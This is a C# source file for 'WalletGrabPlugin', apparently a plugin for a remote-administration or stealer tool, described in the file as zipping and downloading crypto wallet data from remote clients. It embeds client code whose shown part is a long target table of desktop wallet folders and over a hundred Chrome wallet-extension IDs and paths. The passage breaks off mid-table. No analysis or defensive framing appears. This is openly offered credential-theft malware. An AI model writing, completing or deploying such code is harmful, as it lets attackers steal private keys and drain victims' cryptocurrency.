// File: WalletGrabPlugin.cs
#nullable disable

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Runtime.Versioning;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;

namespace WpfApp.Plugins.Builtin
{
    [SupportedOSPlatform("windows")]
    public class WalletGrabPlugin : IServerPlugin
    {
        private PluginHost _host;
        private readonly ConcurrentDictionary<string, WalletGrabUI> _clientUIs = new();

        public string PluginId => "walletgrab";
        public string DisplayName => "Info Grabber";
        public string Version => "1.0.0";
        public string Description => "Zips and downloads crypto wallet data from remote clients.";

        public Task Initialize(PluginHost host)
        {
            _host = host;
            return Task.CompletedTask;
        }

        public Task Shutdown()
        {
            foreach (var ui in _clientUIs.Values)
                ui.Dispose();
            _clientUIs.Clear();
            return Task.CompletedTask;
        }

        public string GetClientCode()
        {
            return @"
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ClientPlugin_walletgrab
{
    public class Main
    {
        private Func<byte[], Task> _send;

        private static readonly Dictionary<string, WalletDef> WalletDefinitions = new Dictionary<string, WalletDef>
        {
            // --- Desktop wallets ---
            { ""bitcoin"",      new WalletDef(""Bitcoin Core"",       @""%APPDATA%\Bitcoin\wallets"",              ""wallet.dat"") },
            { ""ethereum"",     new WalletDef(""Ethereum"",           @""%APPDATA%\Ethereum\keystore"",            ""*"") },
            { ""electrum"",     new WalletDef(""Electrum"",           @""%APPDATA%\Electrum\wallets"",             ""default_wallet"") },
            { ""exodus"",       new WalletDef(""Exodus"",             @""%APPDATA%\Exodus\exodus.wallet"",         ""*"") },
            { ""atomic"",       new WalletDef(""Atomic Wallet"",      @""%APPDATA%\atomic\Local Storage\leveldb"", ""*"") },
            { ""coinomi"",      new WalletDef(""Coinomi"",            @""%APPDATA%\Coinomi\Coinomi\wallets"",      ""*"") },
            { ""guarda"",       new WalletDef(""Guarda"",             @""%APPDATA%\Guarda\Local Storage\leveldb"", ""*"") },
            { ""jaxx"",         new WalletDef(""Jaxx Liberty"",       @""%APPDATA%\com.liberty.jaxx\IndexedDB"",   ""*"") },
            { ""litecoin"",     new WalletDef(""Litecoin Core"",      @""%APPDATA%\Litecoin\wallets"",             ""wallet.dat"") },
            { ""dash"",         new WalletDef(""Dash Core"",          @""%APPDATA%\DashCore\wallets"",             ""wallet.dat"") },
            { ""dogecoin"",     new WalletDef(""Dogecoin Core"",      @""%APPDATA%\Dogecoin\wallets"",             ""wallet.dat"") },
            { ""monero"",       new WalletDef(""Monero"",             @""%USERPROFILE%\Documents\Monero\wallets"", ""*"") },
            { ""zcash"",        new WalletDef(""Zcash"",              @""%APPDATA%\Zcash"",                       ""wallet.dat"") },
            { ""armory"",       new WalletDef(""Armory"",             @""%APPDATA%\Armory"",                      ""*"") },
            { ""bytecoin"",     new WalletDef(""Bytecoin"",           @""%APPDATA%\bytecoin"",                    ""*"") },
            { ""wasabi"",       new WalletDef(""Wasabi Wallet"",      @""%APPDATA%\WasabiWallet"",                ""*"") },
            { ""multibit"",     new WalletDef(""MultiBit"",           @""%APPDATA%\MultiBit"",                    ""*"") },
            { ""binance"",      new WalletDef(""Binance"",            @""%APPDATA%\Binance"",                     ""*"") },
            { ""ledgerlive"",   new WalletDef(""Ledger Live"",        @""%APPDATA%\Ledger Live"",                 ""*"") },
            { ""trezorsuite"",  new WalletDef(""Trezor Suite"",       @""%APPDATA%\@trezor\suite-desktop"",       ""*"") },
            { ""sparrow"",      new WalletDef(""Sparrow"",            @""%APPDATA%\Sparrow"",                     ""*"") },
            { ""daedalus"",     new WalletDef(""Daedalus"",           @""%APPDATA%\Daedalus"",                    ""*"") },
            { ""zelcore"",      new WalletDef(""Zelcore"",            @""%APPDATA%\zelcore"",                     ""*"") },
            { ""tokenpocket"",  new WalletDef(""TokenPocket"",        @""%APPDATA%\TokenPocket"",                 ""*"") },
            { ""backpack"",     new WalletDef(""Backpack"",           @""%APPDATA%\Backpack"",                    ""*"") },
            { ""onekey"",       new WalletDef(""OneKey"",             @""%APPDATA%\OneKey"",                      ""*"") },
            { ""imtoken"",      new WalletDef(""imToken"",            @""%APPDATA%\imToken"",                     ""*"") },
            { ""cakewallet"",   new WalletDef(""Cake Wallet"",        @""%APPDATA%\cake_wallet"",                 ""*"") },
            { ""klever"",       new WalletDef(""Klever"",             @""%APPDATA%\klever"",                      ""*"") },
            { ""bitkeep"",      new WalletDef(""BitKeep"",            @""%APPDATA%\bitkeep"",                     ""*"") },
            { ""infinitywallet"",new WalletDef(""Infinity Wallet"",   @""%APPDATA%\InfinityWallet"",              ""*"") },
            { ""feather"",      new WalletDef(""Feather"",            @""%APPDATA%\feather"",                     ""*"") },
            { ""ravencore"",    new WalletDef(""Raven Core"",         @""%APPDATA%\Raven"",                       ""wallet.dat"") },
            { ""bluewallet"",   new WalletDef(""BlueWallet"",         @""%APPDATA%\BlueWallet"",                  ""*"") },
            { ""bitcoinknots"", new WalletDef(""Bitcoin Knots"",      @""%APPDATA%\BitcoinKnots"",                ""wallet.dat"") },
            { ""bitpay"",       new WalletDef(""BitPay"",             @""%APPDATA%\BitPay"",                      ""*"") },
            { ""electroncash"", new WalletDef(""Electron Cash"",      @""%APPDATA%\ElectronCash\wallets"",        ""*"") },
            { ""electrumltc"",  new WalletDef(""Electrum-LTC"",       @""%APPDATA%\Electrum-LTC\wallets"",        ""*"") },
            { ""myetherwallet"",new WalletDef(""MyEtherWallet"",      @""%APPDATA%\MEW"",                         ""*"") },
            { ""atomicdex"",    new WalletDef(""AtomicDEX"",          @""%APPDATA%\AtomicDEX"",                   ""*"") },
            { ""stakecube"",    new WalletDef(""StakeCube"",          @""%APPDATA%\StakeCube"",                   ""*"") },
            { ""greenaddress"", new WalletDef(""GreenAddress"",       @""%APPDATA%\GreenAddress"",                ""*"") },
            { ""multidoge"",    new WalletDef(""MultiDoge"",          @""%APPDATA%\MultiDoge"",                   ""*"") },
            { ""chia"",         new WalletDef(""Chia Blockchain"",    @""%APPDATA%\Chia Blockchain"",             ""*"") },
            { ""komodo"",       new WalletDef(""Komodo"",             @""%APPDATA%\Komodo"",                      ""*"") },
            { ""mymonero"",     new WalletDef(""MyMonero"",           @""%USERPROFILE%\Documents\MyMonero"",      ""*"") },
            { ""mycrypto"",     new WalletDef(""MyCrypto"",           @""%APPDATA%\MyCrypto"",                    ""*"") },
            { ""bisq"",         new WalletDef(""Bisq"",               @""%APPDATA%\Bisq"",                        ""*"") },
            { ""qtumcore"",     new WalletDef(""Qtum Core"",          @""%APPDATA%\Qtum\wallets"",                ""wallet.dat"") },
            { ""neonwallet"",   new WalletDef(""Neon Wallet"",        @""%APPDATA%\Neon"",                        ""*"") },
            { ""zap"",          new WalletDef(""Zap"",                @""%APPDATA%\Zap"",                         ""*"") },
            { ""tonkeeper"",    new WalletDef(""Tonkeeper"",          @""%APPDATA%\Tonkeeper"",                   ""*"") },
            { ""mytonwallet"",  new WalletDef(""MyTonWallet"",        @""%APPDATA%\MyTonWallet"",                 ""*"") },


            // --- Tier 1 browser extension wallets (Chrome) ---
            { ""metamask_chrome"",     new WalletDef(""MetaMask (Chrome)"",        GetChromiumExtPath(""nkbihfbeogaeaoehlefnkodbefgpgknn""), ""*"") },
            { ""phantom_chrome"",      new WalletDef(""Phantom (Chrome)"",         GetChromiumExtPath(""bfnaelmomeimhlpmgjnjophhpkkoljpa""),  ""*"") },
            { ""trust_chrome"",        new WalletDef(""Trust Wallet (Chrome)"",    GetChromiumExtPath(""egjidjbpglichdcondbcbdnbeeppgdph""),  ""*"") },
            { ""coinbase_chrome"",     new WalletDef(""Coinbase (Chrome)"",        GetChromiumExtPath(""hnfanknocfeofbddgcijnmhnfnkdnaad""),  ""*"") },
            { ""binance_chrome"",      new WalletDef(""Binance (Chrome)"",         GetChromiumExtPath(""fhbohimaelbohpjbbldcngcnapndodjp""),  ""*"") },
            { ""ronin_chrome"",        new WalletDef(""Ronin (Chrome)"",           GetChromiumExtPath(""fnjhmkhhmkbjkkabndcnnogagogdnebn""),  ""*"") },
            { ""keplr_chrome"",        new WalletDef(""Keplr (Chrome)"",           GetChromiumExtPath(""dmkamcknogkgcdfhhbddcghachkejeap""),  ""*"") },
            { ""solflare_chrome"",     new WalletDef(""Solflare (Chrome)"",        GetChromiumExtPath(""bhhhlbepdkbapadjnnooakphnfoefome""), ""*"") },
            { ""tronlink_chrome"",     new WalletDef(""TronLink (Chrome)"",        GetChromiumExtPath(""ibnejdfjmmkpcnlpebklmnkoeoihofec""), ""*"") },
            { ""okx_chrome"",          new WalletDef(""OKX Wallet (Chrome)"",      GetChromiumExtPath(""mcohilncbfahbmgdjkbpemcciiodgcai""), ""*"") },
            { ""petra_chrome"",        new WalletDef(""Petra Aptos (Chrome)"",     GetChromiumExtPath(""ejjladinnckdgjemekebdpeokbikhfci""), ""*"") },
            { ""martian_chrome"",      new WalletDef(""Martian Aptos (Chrome)"",   GetChromiumExtPath(""efbglgofoippbgcjepnhiblaibcnclgk""), ""*"") },
            { ""tonkeeper_chrome"",    new WalletDef(""Tonkeeper (Chrome)"",       GetChromiumExtPath(""nphplpgoakhhjchkkhmiggakijnkhfnd""), ""*"") },
            { ""yoroi_chrome"",        new WalletDef(""Yoroi (Chrome)"",           GetChromiumExtPath(""ffnbelfdoeiohekjlmopcfccegkkdeof""), ""*"") },
            { ""subwallet_chrome"",    new WalletDef(""SubWallet (Chrome)"",       GetChromiumExtPath(""onepkagiidcoeebpjcnnhgjgcegcaeon""), ""*"") },
            { ""xdefi_chrome"",        new WalletDef(""XDEFI (Chrome)"",           GetChromiumExtPath(""hmeobnfnfcmdkdcmlblgagmfpfboieaf""), ""*"") },
            { ""rabbi_chrome"",        new WalletDef(""Rabby (Chrome)"",           GetChromiumExtPath(""acmacodkjbdgmoleebolmdjonilkdbch""), ""*"") },
            { ""temple_chrome"",       new WalletDef(""Temple (Chrome)"",          GetChromiumExtPath(""ookjbnmfphkbkdojgchalgcmbiclkikn""), ""*"") },
            { ""nami_chrome"",         new WalletDef(""Nami (Chrome)"",            GetChromiumExtPath(""lpjjoflnefkemoellhfejdljphbgiief""), ""*"") },
            { ""eternl_chrome"",       new WalletDef(""Eternl (Chrome)"",          GetChromiumExtPath(""kmhcihpebfmpgmihbkipmjlmmioameka""), ""*"") },
            { ""argentx_chrome"",      new WalletDef(""ArgentX (Chrome)"",         GetChromiumExtPath(""glcimiendkopmlppcdopglcfihkfanij""), ""*"") },
            { ""sender_chrome"",       new WalletDef(""Sender (Chrome)"",          GetChromiumExtPath(""epmllkdojomapbghnfiblgeflenmmkki""), ""*"") },
            { ""slope_chrome"",        new WalletDef(""Slope (Chrome)"",           GetChromiumExtPath(""pocmplpaccnhmggajikmpmhccbachogj""), ""*"") },
            { ""sui_chrome"",          new WalletDef(""Sui Wallet (Chrome)"",      GetChromiumExtPath(""apcbohhbhpchmhcmfibbffilnonefimj""), ""*"") },
            { ""suitet_chrome"",       new WalletDef(""Suitet (Chrome)"",          GetChromiumExtPath(""aeoehmmdoacdkkcjgohfgmlejgjampgn""), ""*"") },
            { ""mathwallet_chrome"",   new WalletDef(""Math Wallet (Chrome)"",     GetChromiumExtPath(""afbcbjpbpfadlkmhmclhkeeodmamcflc""), ""*"") },
            { ""coin98_chrome"",       new WalletDef(""Coin98 (Chrome)"",          GetChromiumExtPath(""aeachknmefphepccionboohckonhbmof""), ""*"") },
            { ""wombat_chrome"",       new WalletDef(""Wombat (Chrome)"",          GetChromiumExtPath(""amkmjjmmflddogmhpjloimipbofnfjih""), ""*"") },
            { ""harmony_chrome"",      new WalletDef(""Harmony (Chrome)"",         GetChromiumExtPath(""fnnegphlobjdpkhecapkijjdkgcjhkib""), ""*"") },
            { ""liquality_chrome"",    new WalletDef(""Liquality (Chrome)"",       GetChromiumExtPath(""kpfopkelmapcoipemfendmdcghnegimn""), ""*"") },
            { ""maiar_chrome"",        new WalletDef(""Maiar DeFi (Chrome)"",      GetChromiumExtPath(""dngmlblcodfobpdpecaadgfbcggfjfnm""), ""*"") },
            { ""pali_chrome"",         new WalletDef(""Pali Wallet (Chrome)"",     GetChromiumExtPath(""mgdfndehmgafbmnellifilohnjfedcnm""), ""*"") },
            { ""boltx_chrome"",        new WalletDef(""BoltX (Chrome)"",           GetChromiumExtPath(""anokhimpfofpgndpgoodmljlaplcaaao""), ""*"") },
            { ""everwallet_chrome"",   new WalletDef(""EVER Wallet (Chrome)"",     GetChromiumExtPath(""cgeeodpfagjceefieflmdfgopepemgfm""), ""*"") },
            { ""kardia_chrome"",       new WalletDef(""KardiaChain (Chrome)"",     GetChromiumExtPath(""pdgbckflpmpnamllgjibonhnpeloidp""), ""*"") },
            { ""guild_chrome"",        new WalletDef(""Guild Wallet (Chrome)"",    GetChromiumExtPath(""ohfghjnfbeikcdckkbnpmjnnbelafgpi""), ""*"") },
            { ""mewcx_chrome"",        new WalletDef(""MEW CX (Chrome)"",          GetChromiumExtPath(""nlgbhdfgdhgbiamfdfmbikcdghidoadd""), ""*"") },
            { ""nifty_chrome"",        new WalletDef(""Nifty Wallet (Chrome)"",    GetChromiumExtPath(""jbdaocneiiinmjbjlgalhcelgbejmnid""), ""*"") },
            { ""equal_chrome"",        new WalletDef(""Equal Wallet (Chrome)"",    GetChromiumExtPath(""blnieiiffboillknjnepogjhkgnoapac""), ""*"") },
            { ""bitapp_chrome"",       new WalletDef(""BitApp Wallet (Chrome)"",   GetChromiumExtPath(""fihkakfobcdkdmdoijhdlcojhpldijbe""), ""*"") },
            { ""iwallet_chrome"",      new WalletDef(""iWallet (Chrome)"",         GetChromiumExtPath(""jmmjfnjplmflnnbldhcjgnmnlfkodgcn""), ""*"") },
            { ""saturn_chrome"",       new WalletDef(""Saturn Wallet (Chrome)"",   GetChromiumExtPath(""nkddgncdjgjfcddgfadlnpkjhndeejp""), ""*"") },
            { ""braavos_chrome"",      new WalletDef(""Braavos (Chrome)"",         GetChromiumExtPath(""jnlgamecbhhbkmcjppaaiejjemegbkne""), ""*"") },
            { ""fewcha_chrome"",       new WalletDef(""Fewcha Move (Chrome)"",     GetChromiumExtPath(""bgbgbpncfgdbjkmjhpjjpdkeikbfemop""), ""*"") },
            { ""ethos_chrome"",        new WalletDef(""Ethos Sui (Chrome)"",       GetChromiumExtPath(""ecaigebmcefooeanffkmcefnfaeiohkf""), ""*"") },
            { ""terra_chrome"",        new WalletDef(""Terra Station (Chrome)"",   GetChromiumExtPath(""aiifbnbfobpmeekipheeijimdpnlpgpp""), ""*"") },
            { ""cryptocom_chrome"",    new WalletDef(""Crypto.com (Chrome)"",      GetChromiumExtPath(""iiffjlfjnijpajfppkgijekgpfibmefm""), ""*"") },
            { ""xinpay_chrome"",       new WalletDef(""XinPay (Chrome)"",          GetChromiumExtPath(""bocpokimicclpaiekenaeelehdjllofo""), ""*"") },
            { ""ledger_chrome"",       new WalletDef(""Ledger (Chrome)"",          GetChromiumExtPath(""oafblfbeokhhbkmaooimegmimloonfen""), ""*"") },
            { ""trezor_chrome"",       new WalletDef(""Trezor (Chrome)"",          GetChromiumExtPath(""gffcbjdbhnldnndbdaeofbmjbkjjbeom""), ""*"") },
            { ""zilpay_chrome"",       new WalletDef(""ZilPay (Chrome)"",          GetChromiumExtPath(""lilfiblfdlhjnikdlooooecmenkoampn""), ""*"") },
            { ""pontem_chrome"",       new WalletDef(""Pontem Aptos (Chrome)"",    GetChromiumExtPath(""phkbamefinglalpnbcnhldllphlkhkbi""), ""*"") },
            { ""rise_chrome"",         new WalletDef(""Rise Wallet (Chrome)"",     GetChromiumExtPath(""jnpdfgjokgkamgnmmhemfjbephppicfc""), ""*"") },
            { ""swash_chrome"",        new WalletDef(""Swash (Chrome)"",           GetChromiumExtPath(""cmndjbecilbocjfkibfbifhngkdmjgog""), ""*"") },
            { ""rainbow_chrome"",      new WalletDef(""Rainbow (Chrome)"",         GetChromiumExtPath(""opfgelmcmbiajamepnmloijbpoleiama""), ""*"") },
            { ""bybit_chrome"",        new WalletDef(""Bybit Wallet (Chrome)"",    GetChromiumExtPath(""pdliaogehgdbhbnmkklieghmmjkpigpa""), ""*"") },
            { ""bitget_chrome"",       new WalletDef(""Bitget Wallet (Chrome)"",   GetChromiumExtPath(""jiidiaalihmmhddjgbnbgdfflelocpak""), ""*"") },
            { ""safepal_chrome"",      new WalletDef(""SafePal (Chrome)"",         GetChromiumExtPath(""lgmpcpglpngdoalbgeoldeajfclnhafa""), ""*"") },
            { ""onekey_chrome_ext"",   new WalletDef(""OneKey (Chrome)"",          GetChromiumExtPath(""jnmbobjmhlngoefaiojfljckilhhlhcj""), ""*"") },
            { ""tokenpocket_chrome"",  new WalletDef(""TokenPocket (Chrome)"",     GetChromiumExtPath(""mfgccjchihfkkindfppnaooecgfneiii""), ""*"") },
            { ""kucoin_chrome"",       new WalletDef(""KuCoin Wallet (Chrome)"",   GetChromiumExtPath(""hpglfhgfnhbgpjdenjgheckgonabiahc""), ""*"") },
            { ""clover_chrome"",       new WalletDef(""Clover Wallet (Chrome)"",   GetChromiumExtPath(""nhnkbkgjiklcigcgmlecdijhmgocfeni""), ""*"") },
            { ""goby_chrome"",         new WalletDef(""Goby (Chrome)"",            GetChromiumExtPath(""bocbaocobfocmglnjoiahbolbooihgdn""), ""*"") },
            { ""fluent_chrome"",       new WalletDef(""Fluent Wallet (Chrome)"",   GetChromiumExtPath(""jffjafbohfafleejcfkdbpdmkpkhnhgh""), ""*"") },
            { ""frame_chrome"",        new WalletDef(""Frame (Chrome)"",           GetChromiumExtPath(""ldnlcfkdakmidmpmhgggclnoecmkfcdp""), ""*"") },
            { ""halo_chrome"",         new WalletDef(""Halo Wallet (Chrome)"",     GetChromiumExtPath(""ofpkpnkbopgggmienkoailkkkcljfnpn""), ""*"") },
            { ""imtoken_chrome_ext"",  new WalletDef(""imToken (Chrome)"",         GetChromiumExtPath(""imlpbioimkgnfgnkmcjggokkpmcllida""), ""*"") },
            { ""klever_chrome_ext"",   new WalletDef(""Klever Wallet (Chrome)"",   GetChromiumExtPath(""pjlappartidnocckfgdgnhmlcfgbcpcf""), ""*"") },
            { ""infinity_chrome_ext"", new WalletDef(""Infinity Wallet (Chrome)"", GetChromiumExtPath(""bcmikcmncoemhhbohppahpkgpknebmeh""), ""*"") },
            { ""zelcore_chrome_ext"",  new WalletDef(""Zelcore (Chrome)"",         GetChromiumExtPath(""aodakkplbececjpboakmfidkfdhpagfp""), ""*"") },
            { ""nightly_chrome"",      new WalletDef(""Nightly Wallet (Chrome)"",  GetChromiumExtPath(""fiikommddbeccaoicoejoniammnalkfa""), ""*"") },
            { ""nabox_chrome"",        new WalletDef(""Nabox Wallet (Chrome)"",    GetChromiumExtPath(""nkfdddffgpceedjhpnanpmmmbkgipacc""), ""*"") },

            // --- Tier 2 browser extensions (Chrome) ---
            { ""unisat_chrome"",       new WalletDef(""UniSat (Chrome)"",          GetChromiumExtPath(""ppbibelpcjmhbdihakflkdcoccbgbkpo""), ""*"") },
            { ""corewallet_chrome"",   new WalletDef(""Core Wallet (Chrome)"",     GetChromiumExtPath(""agoakfejjabomempkjlepdflaleeobhb""), ""*"") },
            { ""zerion_chrome"",       new WalletDef(""Zerion (Chrome)"",          GetChromiumExtPath(""klghhnkeealcohjjanjjdaeeggmfmlpl""), ""*"") },
            { ""flow_chrome"",         new WalletDef(""Flow Wallet (Chrome)"",     GetChromiumExtPath(""hpclkefagolihohboafpheddmmgdffjm""), ""*"") },
            { ""magiceden_chrome"",    new WalletDef(""Magic Eden (Chrome)"",      GetChromiumExtPath(""mkpegjkblkkefacfnmkajcjmabijhclg""), ""*"") },
            { ""lace_chrome"",         new WalletDef(""Lace (Chrome)"",            GetChromiumExtPath(""gafhhkghbfjjkeiendhlofajokpaflmk""), ""*"") },
            { ""talisman_chrome"",     new WalletDef(""Talisman (Chrome)"",        GetChromiumExtPath(""fijngjgcjhjmmpcmkeiomlglpeiijkld""), ""*"") },
            { ""fearless_chrome"",     new WalletDef(""Fearless Wallet (Chrome)"", GetChromiumExtPath(""nhlnehondigmgckngjomcpcefcdplmgc""), ""*"") },
            { ""leapcosmos_chrome"",   new WalletDef(""Leap Cosmos (Chrome)"",     GetChromiumExtPath(""fcfcfllfndlomdhbehjjcoimbgofdncg""), ""*"") },
            { ""xverse_chrome"",       new WalletDef(""Xverse (Chrome)"",          GetChromiumExtPath(""idnnbdplmphpflfnlkomgpfbpcgelopg""), ""*"") },
            { ""gatewallet_chrome"",   new WalletDef(""Gate Wallet (Chrome)"",     GetChromiumExtPath(""cpmkedoipcpimgecpmgpldfpohjplkpp""), ""*"") },
            { ""leather_chrome"",      new WalletDef(""Leather (Chrome)"",         GetChromiumExtPath(""ldinpeekobnhjjdofggfgjlcehhmanlj""), ""*"") },
            { ""enkrypt_chrome"",      new WalletDef(""Enkrypt (Chrome)"",         GetChromiumExtPath(""kkpllkodjeloidieedojogacfhpaihoh""), ""*"") },
            { ""exodusweb3_chrome"",   new WalletDef(""Exodus Web3 (Chrome)"",     GetChromiumExtPath(""aholpfdialjgjfhomihkjbmgjidlcdno""), ""*"") },
            { ""neline_chrome"",       new WalletDef(""NeoLine (Chrome)"",         GetChromiumExtPath(""cphhlgmgameodnhkjdmkpanlelnlohao""), ""*"") },
            { ""polkagate_chrome"",    new WalletDef(""PolkaGate (Chrome)"",       GetChromiumExtPath(""ginchbkmljhldofnbjabmeophlhdldgp""), ""*"") },
            { ""suiwallet2_chrome"",   new WalletDef(""Sui Wallet (Chrome)"",      GetChromiumExtPath(""opcgpfmipidbgpenhmajoajpbobppdil""), ""*"") },
            { ""venom_chrome"",        new WalletDef(""Venom Wallet (Chrome)"",    GetChromiumExtPath(""ojggmchlghnjlapmfbnjholfjkiidbch""), ""*"") },
            { ""initia_chrome"",       new WalletDef(""Initia Wallet (Chrome)"",   GetChromiumExtPath(""ffbceckpkpbcmgiaehlloocglmijnpmp""), ""*"") },
            { ""manta_chrome"",        new WalletDef(""Manta Wallet (Chrome)"",    GetChromiumExtPath(""enabgbdfcbaehmbigakijjabdpdnimlg""), ""*"") },
            { ""ultra_chrome"",        new WalletDef(""Ultra Wallet (Chrome)"",    GetChromiumExtPath(""kjjebdkfeagdoogagbhepmbimaphnfln""), ""*"") },
            { ""zeal_chrome"",         new WalletDef(""Zeal Wallet (Chrome)"",     GetChromiumExtPath(""heamnjbnflcikcggoiplibfommfbkjpj""), ""*"") },
            { ""rose_chrome"",         new WalletDef(""ROSE Wallet (Chrome)"",     GetChromiumExtPath(""ppdadbejkmjnefldpcdjhnkpbjkikoip""), ""*"") },
            { ""pwr_chrome"",          new WalletDef(""PWR Wallet (Chrome)"",      GetChromiumExtPath(""kennjipeijpeengjlogfdjkiiadhbmjl""), ""*"") },
            { ""aurox_chrome"",        new WalletDef(""Aurox Wallet (Chrome)"",    GetChromiumExtPath(""kilnpioakcdndlodeeceffgjdpojajlo""), ""*"") },
            { ""stargazer_chrome"",    new WalletDef(""Stargazer (Chrome)"",       GetChromiumExtPath(""pgiaagfkgcbnmiiolekcfmljdagdhlcm""), ""*"") },
            { ""crossmark_chrome"",    new WalletDef(""Crossmark (Chrome)"",       GetChromiumExtPath(""canipghmckojpianfgiklhbgpfmhjkjg""), ""*"") },
            { ""openmask_chrome"",     new WalletDef(""OpenMask TON (Chrome)"",    GetChromiumExtPath(""penjlddjkjgpnkllboccdgccekpkcbin""), ""*"") },
            { ""osm_chrome"",          new WalletDef(""Osm Wallet (Chrome)"",      GetChromiumExtPath(""kmphdnilpmdejikjdnlbcnmnabepfgkh""), ""*"") },
            { ""cosmostation_chrome"", new WalletDef(""Cosmostation (Chrome)"",    GetChromiumExtPath(""fpkhgmpbidmiogeglndfbkegfdlnajnf""), ""*"") },
            { ""leosolana_chrome"",    new WalletDef(""Leo Solana (Chrome)"",      GetChromiumExtPath(""nebnhfamliijlghikdgcigoebonmoibm""), ""*"") },
            { ""glow_chrome"",         new WalletDef(""Glow Solana (Chrome)"",     GetChromiumExtPath(""ojbcfhjmpigfobfclfflafhblgemeidi""), ""*"") },
            { ""prax_chrome"",         new WalletDef(""Prax Wallet (Chrome)"",     GetChromiumExtPath(""lkpmkhpnhknhmibgnmmhdhgdilepfghe""), ""*"") },
            { ""fuel_chrome"",         new WalletDef(""Fuel Wallet (Chrome)"",     GetChromiumExtPath(""dldjpboieedgcmpkchcjcbijingjcgok""), ""*"") },
            { ""welldone_chrome"",     new WalletDef(""WELLDONE (Chrome)"",        GetChromiumExtPath(""bmkakpenjmcpfhhjadflneinmhboecjf""), ""*"") },
            { ""radix_chrome"",        new WalletDef(""Radix Wallet (Chrome)"",    GetChromiumExtPath(""bfeplaecgkoeckiidkgkmlllfbaeplgm""), ""*"") },
            { ""meteor_chrome"",       new WalletDef(""Meteor Wallet (Chrome)"",   GetChromiumExtPath(""pcndjhkinnkaohffealmlmhaepkpmgkb""), ""*"") },
            { ""atomicext_chrome"",    new WalletDef(""Atomic Ext (Chrome)"",      GetChromiumExtPath(""gjnckgkfmgmibbkoficdidcljeaaaheg""), ""*"") },
            { ""alby_chrome"",         new WalletDef(""Alby Lightning (Chrome)"",  GetChromiumExtPath(""iokeahhehimjnekafflcihljlcjccdbe""), ""*"") },
            { ""casper_chrome"",       new WalletDef(""Casper Wallet (Chrome)"",   GetChromiumExtPath(""abkahkcbhngaebpcgfmhkoioedceoigp""), ""*"") },
            { ""reef_chrome"",         new WalletDef(""Reef Chain (Chrome)"",      GetChromiumExtPath(""mjgkpalnahacmhkikiommfiomhjipgjn""), ""*"") },
            { ""auro_chrome"",         new WalletDef(""Auro Wallet (Chrome)"",     GetChromiumExtPath(""cnmamaachppnkjgnildpdmkaakejnhae""), ""*"") },
            { ""komodoext_chrome"",    new WalletDef(""Komodo Wallet (Chrome)"",   GetChromiumExtPath(""dgiehkgfknklegdhekgeabnhgfjhbajd""), ""*"") },
            { ""beam_chrome"",         new WalletDef(""Beam Wallet (Chrome)"",     GetChromiumExtPath(""ilhaljfiglknggcoegeknjghdgampffk""), ""*"") },
            { ""multiext_chrome"",     new WalletDef(""Multi Wallet (Chrome)"",    GetChromiumExtPath(""nlgnepoeokdfodgjkjiblkadkjbdfmgd""), ""*"") },
            { ""keeper_chrome"",       new WalletDef(""Keeper Wallet (Chrome)"",   GetChromiumExtPath(""lpilbniiabackdjcionkobglmddfbcjo""), ""*"") },
            { ""yours_chrome"",        new WalletDef(""Yours Wallet (Chrome)"",    GetChromiumExtPath(""mlbnicldlpdimbjdcncnklfempedeipj""), ""*"") },
            { ""flint_chrome"",        new WalletDef(""Flint Wallet (Chrome)"",    GetChromiumExtPath(""hnhobjmcibchnmglfbldbfabcgaknlkj""), ""*"") },
            { ""nautilus_chrome"",     new WalletDef(""Nautilus Wallet (Chrome)"", GetChromiumExtPath(""gjlmehlldlphhljhpnlddaodbjjcchai""), ""*"") },
            { ""coinhub_chrome"",      new WalletDef(""Coinhub (Chrome)"",         GetChromiumExtPath(""jgaaimajipbpdogpdglhaphldakikgef""), ""*"") },
            { ""frontier_chrome"",     new WalletDef(""Frontier Wallet (Chrome)"", GetChromiumExtPath(""kppfdiipphfccemcignhifpjkapfbihd""), ""*"") },
            { ""fluvi_chrome"",        new WalletDef(""Fluvi Wallet (Chrome)"",    GetChromiumExtPath(""mmmjbcfofconkannjonfmjjajpllddbg""), ""*"") },
            { ""glass_chrome"",        new WalletDef(""Glass Wallet (Chrome)"",    GetChromiumExtPath(""loinekcabhlmhjjbocijdoimmejangoa""), ""*"") },
            { ""compass_chrome"",      new WalletDef(""Compass Sei (Chrome)"",     GetChromiumExtPath(""anokgmphncpekkhclmingpimjmcooifb""), ""*"") },
            { ""havah_chrome"",        new WalletDef(""HAVAH Wallet (Chrome)"",    GetChromiumExtPath(""cnncmdhjacpkmjmkcafchppbnpnhdmon""), ""*"") },
            { ""desig_chrome"",        new WalletDef(""Desig Wallet (Chrome)"",    GetChromiumExtPath(""panpgppehdchfphcigocleabcmcgfoca""), ""*"") },
            { ""onto_chrome"",         new WalletDef(""ONTO Wallet (Chrome)"",     GetChromiumExtPath(""ifckdpamphokdglkkdomedpdegcjhjdp""), ""*"") },
            { ""suiet2_chrome"",       new WalletDef(""Suiet (Chrome)"",           GetChromiumExtPath(""khpkpbbcccdmmclmpigdgddabeilkdpd""), ""*"") },
            { ""slope2_chrome"",       new WalletDef(""Slope (Chrome)"",           GetChromiumExtPath(""pocmplpaccanhmnllbbkpgfliimjljgo""), ""*"") },
            { ""kardia2_chrome"",      new WalletDef(""KardiaChain (Chrome)"",     GetChromiumExtPath(""pdadjkfkgcafgbceimcpbkalnfnepbnk""), ""*"") },
            { ""riseaptos2_chrome"",   new WalletDef(""Rise Aptos (Chrome)"",      GetChromiumExtPath(""hbbgbephgojikajhfbomhlmmollphcad""), ""*"") },
            { ""nabox2_chrome"",       new WalletDef(""Nabox (Chrome)"",           GetChromiumExtPath(""nknhiehlklippafakaeklbeglecifhad""), ""*"") },
            { ""tonkeeperweb_chrome"", new WalletDef(""Tonkeeper Web (Chrome)"",   GetChromiumExtPath(""omaabbefbmiijedngplfjmnooppbclkk""), ""*"") },
            { ""bitfinity_chrome"",    new WalletDef(""Bitfinity Wallet (Chrome)"",GetChromiumExtPath(""jnldfbidonfeldmalbflbmlebbipcnle""), ""*"") },
            { ""lootrush_chrome"",     new WalletDef(""LootRush Wallet (Chrome)"", GetChromiumExtPath(""lfmmjkfllhmfmkcobchabopkcefjkoip""), ""*"") },
